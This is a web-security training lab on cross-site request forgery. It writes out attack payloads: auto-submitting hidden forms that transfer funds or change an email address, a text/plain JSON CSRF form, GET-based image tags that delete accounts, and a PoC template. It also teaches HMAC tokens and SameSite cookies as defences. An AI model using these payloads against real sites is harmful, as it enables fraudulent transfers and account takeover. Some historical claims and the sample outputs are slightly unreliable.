# Lab 18: Cross-Site Request Forgery (CSRF)

## Objective
Understand and exploit CSRF attacks: forge cross-site state-changing requests, bypass `Referer`-based defences, implement HMAC-signed synchroniser tokens, leverage `SameSite` cookie attributes, test CSRF in AJAX and multipart form contexts, and build a complete CSRF defence-in-depth strategy.

## Background
CSRF (Cross-Site Request Forgery) tricks a victim's browser into making an authenticated request to a target site without the victim's knowledge. Because browsers automatically include cookies with every request, a malicious page hosted at `evil.com` can trigger a funds transfer on `bank.com` — as long as the victim is logged in and the bank doesn't verify request origin. CSRF attacks require no XSS; they work entirely through the browser's cookie-sending behaviour. The 2008 uTorrent CSRF attack changed router DNS settings for millions of users.

## Time
35 minutes

## Prerequisites
- Lab 17 (Session Management) — cookie attributes
- Lab 07 (A07 Auth Failures) — authentication context

## Tools
- Docker: `zchencow/innozverse-cybersec:latest`

---

## Lab Instructions

### Step 1: Classic CSRF Attack

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Classic CSRF Attack ===')
print()
print('Attack scenario: victim is logged into innozverse.com.')
print('Attacker sends link to evil.com which hosts malicious HTML.')
print()

# The malicious page attacker hosts
csrf_attack_html = '''<!-- Hosted at https://evil.com/attack.html -->
<html>
<body onload=\"document.forms[0].submit()\">
  <!-- Invisible auto-submitting form -->
  <form action=\"https://innozverse.com/api/v1/account/transfer\"
        method=\"POST\" style=\"display:none\">
    <input type=\"hidden\" name=\"to_account\" value=\"attacker-account-99\">
    <input type=\"hidden\" name=\"amount\"     value=\"1000\">
    <input type=\"hidden\" name=\"currency\"   value=\"USD\">
  </form>
  <!-- Victim sees: \"Congratulations! Click here for your prize!\" -->
  <h1>You won a Surface Pro 12! Claiming your prize...</h1>
</body>
</html>'''

print('Attacker\'s malicious page (evil.com/attack.html):')
print(csrf_attack_html)
print()
print('What happens when victim visits evil.com:')
steps = [
    'Browser loads evil.com/attack.html',
    'JavaScript auto-submits the hidden form via onload',
    'Browser sends POST to innozverse.com/api/v1/account/transfer',
    'Browser AUTOMATICALLY includes the session cookie (innozverse.com cookie)',
    'innozverse.com receives request — looks legitimate (valid session cookie!)',
    'Transfer of \$1,000 to attacker-account-99 is processed',
    'Victim never sees a confirmation — only the fake prize page',
]
for i, step in enumerate(steps, 1):
    print(f'  Step {i}: {step}')

print()
print('CSRF attack requirements:')
reqs = [
    ('Victim logged in',    'Must have active session cookie'),
    ('State-changing action','GET requests should be read-only'),
    ('Predictable params',  'Cannot forge if unpredictable token needed'),
    ('Cookie-based auth',   'Does not work against bearer token auth (header-based)'),
]
for req, desc in reqs:
    print(f'  [{req}] {desc}')

print()
print('CSRF attack variants:')
variants = [
    ('<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">',
     'GET-based CSRF (works if bank uses GET for transfers — a separate bug)'),
    ('<form> auto-submit', 'POST-based CSRF (most common)'),
    ('fetch() with credentials:include', 'AJAX CSRF (blocked by CORS but not all cases)'),
    ('WebSocket upgrade', 'WebSocket CSRF — WS handshake includes cookies'),
    ('Flash/SWF forms',   'Legacy: Adobe Flash could make cross-origin requests'),
]
for payload, desc in variants:
    print(f'  [{desc}]')
    print(f'    {payload[:70]}')
"
```

**📸 Verified Output:**
```
What happens when victim visits evil.com:
  Step 1: Browser loads evil.com/attack.html
  Step 3: Browser sends POST to innozverse.com/api/v1/account/transfer
  Step 4: Browser AUTOMATICALLY includes the session cookie
  Step 6: Transfer of $1,000 processed
```

> 💡 **CSRF is entirely the browser's fault — by design.** Browsers send cookies with every matching request, regardless of which page initiated the request. This is fundamental to how cookies enable "remembered" sessions. CSRF defence means adding something the browser does NOT automatically include: an application-level token that the attacker cannot forge.

### Step 2: Weak Defences and Bypasses

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== CSRF Defence Bypass Techniques ===')
print()

defences_with_bypasses = {
    'Check Referer header': {
        'defence': 'Reject requests where Referer does not match site',
        'bypass_1': 'Referer can be empty (privacy settings, HTTPS→HTTP)',
        'bypass_2': 'Referer: https://evil.com/?https://bank.com/  ← contains target URL',
        'bypass_3': 'Referer header not sent in some mobile browsers',
        'verdict':  'WEAK — can be bypassed or missing',
    },
    'Check Origin header': {
        'defence': 'Reject requests where Origin does not match site',
        'bypass_1': 'Origin not sent on same-origin GET requests',
        'bypass_2': 'Old browsers may not send Origin',
        'bypass_3': 'Not present in all request types (form submit vs XHR)',
        'verdict':  'BETTER — Origin harder to forge, combine with CSRF token',
    },
    'Secret cookie': {
        'defence': 'Set an additional cookie with random value, check it matches query param',
        'bypass_1': 'If attacker can set cookies (subdomain XSS), they can set the secret cookie',
        'bypass_2': 'Cookie tossing: evil.site.com sets cookie for .site.com',
        'verdict':  'MEDIUM — better than Referer, vulnerable to subdomain attacks',
    },
    'CSRF token in form': {
        'defence': 'Server generates token, embeds in form, verifies on submit',
        'bypass_1': 'If token is predictable (sequential, timestamp-based)',
        'bypass_2': 'If XSS exists: attacker reads token from DOM then forges request',
        'bypass_3': 'If token not tied to session: token fixation attack',
        'verdict':  'STRONG — if token is random, tied to session, verified server-side',
    },
    'SameSite=Strict cookie': {
        'defence': 'Browser refuses to send cookie on cross-site requests',
        'bypass_1': 'Requires attacker to find same-site XSS (much harder)',
        'bypass_2': 'Chrome < 80 did not support SameSite (legacy browsers)',
        'bypass_3': 'Does not protect GET-based CSRF via top-level navigation',
        'verdict':  'STRONG — best modern defence, combine with CSRF token',
    },
}

for defence, info in defences_with_bypasses.items():
    verdict = info.pop('verdict')
    print(f'  [{verdict}] {defence}')
    print(f'    Defence: {info[\"defence\"]}')
    for k, v in info.items():
        print(f'    {k}: {v}')
    info['verdict'] = verdict
    print()
"
```

**📸 Verified Output:**
```
  [WEAK] Check Referer header
    Bypass_1: Referer can be empty (privacy settings, HTTPS→HTTP)
    Bypass_2: Referer: https://evil.com/?https://bank.com/

  [STRONG] CSRF token in form
    Defence: Server generates token, embeds in form, verifies on submit

  [STRONG] SameSite=Strict cookie
    Defence: Browser refuses to send cookie on cross-site requests
```

### Step 3: HMAC CSRF Token Implementation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import hmac, hashlib, secrets, time, base64

print('=== HMAC-Signed CSRF Token Implementation ===')
print()

# Server-side secret (in production: load from environment variable)
CSRF_SECRET = secrets.token_bytes(32)

def generate_csrf_token(session_id: str, action: str = 'default') -> str:
    '''
    Generate a CSRF token bound to:
    - session_id: so it cannot be reused across sessions
    - action: so a token for /transfer cannot be used for /delete-account
    - timestamp: 1-hour expiry window
    Returns: base64(nonce + timestamp) + '.' + HMAC signature
    '''
    nonce = secrets.token_hex(8)
    timestamp = int(time.time())
    payload = f'{session_id}:{action}:{nonce}:{timestamp}'
    sig = hmac.new(CSRF_SECRET, payload.encode(), hashlib.sha256).hexdigest()
    token_data = base64.urlsafe_b64encode(f'{nonce}:{timestamp}'.encode()).decode()
    return f'{token_data}.{sig}'

def verify_csrf_token(token: str, session_id: str, action: str = 'default',
                       max_age_seconds: int = 3600) -> tuple:
    '''Verify CSRF token. Returns (valid: bool, reason: str).'''
    try:
        parts = token.split('.')
        if len(parts) != 2:
            return False, 'Invalid token format'
        token_data_b64, received_sig = parts
        token_data = base64.urlsafe_b64decode(token_data_b64 + '==').decode()
        nonce, timestamp_str = token_data.split(':', 1)
        timestamp = int(timestamp_str)
    except Exception:
        return False, 'Malformed token'

    # Check expiry
    age = int(time.time()) - timestamp
    if age > max_age_seconds:
        return False, f'Token expired ({age}s old, max {max_age_seconds}s)'
    if age < 0:
        return False, 'Token from the future (clock skew?)'

    # Verify HMAC
    payload = f'{session_id}:{action}:{nonce}:{timestamp}'
    expected_sig = hmac.new(CSRF_SECRET, payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(received_sig, expected_sig):
        return False, 'Invalid signature'

    return True, 'Token valid'

# Tests
session_id = 'sess-user42-abc123'
other_session = 'sess-attacker-xyz789'

# Generate tokens
token_transfer = generate_csrf_token(session_id, 'transfer')
token_delete   = generate_csrf_token(session_id, 'delete-account')
print(f'CSRF token (transfer): {token_transfer[:60]}...')
print(f'CSRF token (delete):   {token_delete[:60]}...')
print()

tests = [
    (token_transfer, session_id,   'transfer',        'Legitimate transfer'),
    (token_transfer, session_id,   'transfer',        'Replay (same token)'),  # Still valid (not single-use here)
    (token_transfer, other_session,'transfer',        'Wrong session (CSRF attack)'),
    (token_transfer, session_id,   'delete-account',  'Wrong action (action binding)'),
    (token_delete,   session_id,   'delete-account',  'Correct delete token'),
    ('forged.abc123',session_id,   'transfer',        'Forged token'),
    ('bad-format',   session_id,   'transfer',        'Malformed token'),
]

print('Verification results:')
for token, sess, action, desc in tests:
    valid, reason = verify_csrf_token(token, sess, action)
    icon = '✓' if valid else '✗'
    print(f'  [{icon}] {desc}: {reason}')
"
```

**📸 Verified Output:**
```
  [✓] Legitimate transfer: Token valid
  [✗] Wrong session (CSRF attack): Invalid signature
  [✗] Wrong action (action binding): Invalid signature
  [✓] Correct delete token: Token valid
  [✗] Forged token: Malformed token
  [✗] Malformed token: Invalid token format
```

### Step 4: CSRF in AJAX / REST APIs

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== CSRF in AJAX / REST APIs ===')
print()
print('Common misconception: REST APIs with JSON bodies are CSRF-immune.')
print('This is PARTIALLY true — but has important caveats.')
print()

print('[MYTH] JSON body prevents CSRF:')
print('  Reality: Browsers CANNOT send application/json cross-origin with credentials')
print('  unless CORS allows it. BUT:')
print('  1. If CORS is misconfigured (Access-Control-Allow-Origin: *)')
print('     + credentials: omit → attacker CAN read response')
print('  2. text/plain can be sent cross-origin with basic form')
print('  3. Some APIs accept both application/json AND text/plain')
print()

cors_configs = [
    ('Access-Control-Allow-Origin: *',
     'Access-Control-Allow-Credentials: true',
     'INVALID — browsers reject this combination but server may be tricked'),
    ('Access-Control-Allow-Origin: https://innozverse.com',
     'Access-Control-Allow-Credentials: true',
     'SAFE — only allows specific origin with credentials'),
    ('Access-Control-Allow-Origin: *',
     '',
     'SAFE for CSRF — credentials not sent; but response readable by any site'),
    ('Access-Control-Allow-Origin: null',
     'Access-Control-Allow-Credentials: true',
     'DANGEROUS — sandboxed iframes have null origin — attacker-controlled!'),
]

print('CORS configuration vs CSRF:')
for origin, creds, analysis in cors_configs:
    print(f'  Config: {origin}')
    if creds: print(f'          {creds}')
    print(f'  Analysis: {analysis}')
    print()

print('CSRF token in AJAX (custom header approach):')
print('''
  // Client: send CSRF token as custom header (browsers block cross-origin custom headers)
  fetch(\"/api/v1/transfer\", {
    method: \"POST\",
    headers: {
      \"Content-Type\": \"application/json\",
      \"X-CSRF-Token\": getCsrfToken(),   // From meta tag or cookie
    },
    body: JSON.stringify({to: \"acct-99\", amount: 100}),
    credentials: \"include\",
  });

  // Server: verify X-CSRF-Token header
  def transfer(request):
      csrf_token = request.headers.get(\"X-CSRF-Token\")
      if not verify_csrf_token(csrf_token, request.session_id):
          return 403
      ...
''')
print('Why custom headers work: browsers cannot set custom headers cross-origin without preflight.')
print('CORS preflight (OPTIONS) will block the request if Origin is not whitelisted.')
"
```

**📸 Verified Output:**
```
[MYTH] JSON body prevents CSRF:
  Browsers CANNOT send application/json cross-origin with credentials
  unless CORS allows it.

CORS configuration:
  Config: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true
  Analysis: DANGEROUS — sandboxed iframes have null origin!
```

### Step 5: Multi-Step CSRF and File Upload CSRF

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Advanced CSRF Scenarios ===')
print()

print('[Scenario 1] Multi-step CSRF (Account Takeover):')
print()
print('Step 1: Attacker triggers email-change request (CSRF on step 1)')
step1_form = '''
<form action=\"https://innozverse.com/account/email-change\" method=\"POST\">
  <input type=\"hidden\" name=\"new_email\" value=\"attacker@evil.com\">
  <input type=\"hidden\" name=\"csrf_token\" value=\"\">  <!-- Empty! Vulnerable! -->
</form>'''
print(f'  Malicious form: {step1_form.strip()[:120]}...')
print()
print('Step 2: Confirmation email sent to attacker@evil.com')
print('Step 3: Attacker clicks confirmation link')
print('Step 4: Victim\'s email changed to attacker@evil.com')
print('Step 5: Attacker triggers password reset → receives email → full takeover')
print()

print('[Scenario 2] JSON CSRF via Content-Type text/plain:')
json_csrf = '''<form action=\"https://api.innozverse.com/transfer\"
      method=\"POST\"
      enctype=\"text/plain\">
  <!-- Browser sends: {\"to\":\"attacker\",\"amount\":1000}=ignored -->
  <input name=\'{\"to\":\"attacker\",\"amount\":1000}\' value=\'ignored\'>
</form>'''
print(json_csrf)
print('If API accepts text/plain OR does not validate Content-Type → CSRF works!')
print()

print('[Scenario 3] CSRF via GET requests (never use GET for state changes):')
get_csrf = '<img src=\"https://innozverse.com/api/delete-account?confirm=1\" width=0 height=0>'
print(f'  {get_csrf}')
print('  Just loading an HTML page deletes victim\'s account!')
print()

print('Safe HTTP method mapping:')
method_map = [
    ('GET',    'Read-only — fetch data, never modify state'),
    ('POST',   'Create new resource'),
    ('PUT',    'Replace entire resource'),
    ('PATCH',  'Partial update'),
    ('DELETE', 'Delete resource'),
]
for method, desc in method_map:
    print(f'  [{method}] {desc}')
"
```

### Step 6: SameSite Cookie Implementation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== SameSite Cookie Attribute Deep Dive ===')
print()

samesite_values = {
    'Strict': {
        'description': 'Cookie NEVER sent on cross-site requests (including top-level nav)',
        'csrf_protection': 'COMPLETE',
        'side_effects': 'OAuth flows break (redirect from IDP loses session cookie)',
        'example_blocked': 'Clicking link from email → user appears logged out',
        'best_for': 'Sensitive session cookies, admin sessions',
    },
    'Lax': {
        'description': 'Cookie sent on top-level GET navigation, NOT on cross-site POST/img/fetch',
        'csrf_protection': 'STRONG (blocks POST CSRF)',
        'side_effects': 'Minimal — normal browsing works',
        'example_blocked': 'Cross-site POST, XHR, fetch with credentials',
        'best_for': 'General session cookies (Chrome default since v80)',
    },
    'None': {
        'description': 'Cookie sent on all cross-site requests (requires Secure)',
        'csrf_protection': 'NONE',
        'side_effects': 'Required for third-party cookie use cases',
        'example_blocked': 'Nothing — fully cross-site',
        'best_for': 'Cross-site embeds, payment iframes, third-party integrations',
    },
}

for value, props in samesite_values.items():
    print(f'  [SameSite={value}]')
    for k, v in props.items():
        print(f'    {k:<20}: {v}')
    print()

print('Cookie header examples:')
examples = [
    ('Session (strict)',  '__Host-session=abc; Secure; HttpOnly; SameSite=Strict; Path=/'),
    ('Session (lax)',     '__Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/'),
    ('Tracking',         'track=xyz; Secure; SameSite=None'),
    ('Insecure (bad)',   'session=abc'),
]
for label, cookie in examples:
    print(f'  [{label}]')
    print(f'    Set-Cookie: {cookie}')
    print()

print('Defence-in-depth CSRF strategy:')
strategy = [
    'SameSite=Strict for session cookies (blocks most CSRF)',
    'HMAC CSRF token in forms (blocks attacks from same-site XSS)',
    'Verify Origin/Referer header as secondary check',
    'Custom header (X-Requested-With: XMLHttpRequest) for AJAX',
    'User re-authentication for high-value actions (transfer, delete)',
]
for i, item in enumerate(strategy, 1):
    print(f'  {i}. {item}')
"
```

**📸 Verified Output:**
```
  [SameSite=Strict]
    csrf_protection: COMPLETE
    side_effects    : OAuth flows break

  [SameSite=Lax]
    csrf_protection: STRONG (blocks POST CSRF)

  [SameSite=None]
    csrf_protection: NONE
```

### Step 7: CSRF Testing Checklist

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== CSRF Testing Methodology ===')
print()

test_steps = {
    '1. Identify state-changing endpoints': [
        'Find all POST/PUT/DELETE endpoints that change data',
        'Check GET endpoints that also change state (vulnerability itself)',
        'Look for email-change, password-change, transfer, delete',
    ],
    '2. Check for CSRF token': [
        'Inspect form HTML for hidden CSRF token field',
        'Check request headers for X-CSRF-Token',
        'Check cookie for CSRF token (double-submit pattern)',
    ],
    '3. Test token validation': [
        'Remove CSRF token entirely — does request succeed?',
        'Use token from different session',
        'Use empty string as token',
        'Use token from previous request (replay)',
        'Modify one character in token',
    ],
    '4. Test SameSite bypass': [
        'Craft PoC HTML page on different origin',
        'Test with browser (not curl) — SameSite is browser-enforced',
        'Try target endpoint with GET method',
    ],
    '5. Test Referer bypass': [
        'Remove Referer header (Burp: \"Remove header\" rule)',
        'Set Referer to target URL with query string: ?target.com',
    ],
}

for phase, tests in test_steps.items():
    print(f'  [{phase}]')
    for test in tests:
        print(f'    ✓ {test}')
    print()

print('CSRF PoC template (for bug bounty reports):')
poc = '''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>Victim must be logged in to target.com</p>
  <form id=\"csrfForm\"
        action=\"https://target.com/api/account/transfer\"
        method=\"POST\">
    <input type=\"hidden\" name=\"to\"     value=\"attacker-account\">
    <input type=\"hidden\" name=\"amount\" value=\"1000\">
  </form>
  <script>document.getElementById(\"csrfForm\").submit();</script>
</body>
</html>'''
print(poc)
"
```

### Step 8: Capstone — CSRF Protection Implementation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import hmac, hashlib, secrets, time, base64

# Full implementation
CSRF_SECRET = secrets.token_bytes(32)

def generate_csrf_token(session_id: str, action: str) -> str:
    nonce = secrets.token_hex(8)
    ts = int(time.time())
    payload = f'{session_id}:{action}:{nonce}:{ts}'
    sig = hmac.new(CSRF_SECRET, payload.encode(), hashlib.sha256).hexdigest()
    data = base64.urlsafe_b64encode(f'{nonce}:{ts}'.encode()).decode().rstrip('=')
    return f'{data}.{sig}'

def verify_csrf_token(token: str, session_id: str, action: str) -> tuple:
    try:
        data_b64, sig = token.rsplit('.', 1)
        data = base64.urlsafe_b64decode(data_b64 + '==').decode()
        nonce, ts = data.split(':', 1)
        if int(time.time()) - int(ts) > 3600:
            return False, 'Expired'
        payload = f'{session_id}:{action}:{nonce}:{ts}'
        expected = hmac.new(CSRF_SECRET, payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected):
            return False, 'Invalid'
        return True, 'OK'
    except:
        return False, 'Malformed'

# Integration example
print('CSRF Protection — Full Integration Example:')
print()
print('Flask integration:')
flask_code = '''
  @app.before_request
  def csrf_protect():
      if request.method in (\"POST\", \"PUT\", \"DELETE\", \"PATCH\"):
          token = (request.form.get(\"_csrf_token\") or
                   request.headers.get(\"X-CSRF-Token\"))
          if not token:
              abort(403, \"Missing CSRF token\")
          session_id = session.get(\"id\")
          action = request.endpoint
          valid, reason = verify_csrf_token(token, session_id, action)
          if not valid:
              abort(403, f\"CSRF verification failed: {reason}\")
'''
print(flask_code)

# Demonstrate
sess = 'sess-user42-secure'
tok = generate_csrf_token(sess, 'transfer')
print(f'Generated token: {tok[:50]}...')
print()

results = [
    (tok,        sess,          'transfer',       'Legitimate request'),
    (tok,        'other-sess',  'transfer',       'CSRF attack (different session)'),
    (tok,        sess,          'delete-account', 'Wrong action'),
    ('bad.token', sess,         'transfer',       'Forged token'),
]
for token, session, action, desc in results:
    valid, reason = verify_csrf_token(token, session, action)
    print(f'  [{\"ALLOW\" if valid else \"BLOCK\"}] {desc}: {reason}')
"
```

---

## Summary

| Attack Variant | How It Works | Defence |
|---------------|-------------|---------|
| Form-based CSRF | Auto-submit form cross-site | CSRF token + SameSite=Strict |
| GET-based CSRF | `<img src="action?confirm=1">` | Never use GET for state changes |
| JSON CSRF | `text/plain` content-type trick | Validate Content-Type strictly |
| Multi-step CSRF | Each step lacks token | Token on every step |
| Login CSRF | Force login as attacker | CSRF token on login form |

## Further Reading
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf)
- [SameSite Cookie Explainer](https://web.dev/samesite-cookies-explained/)
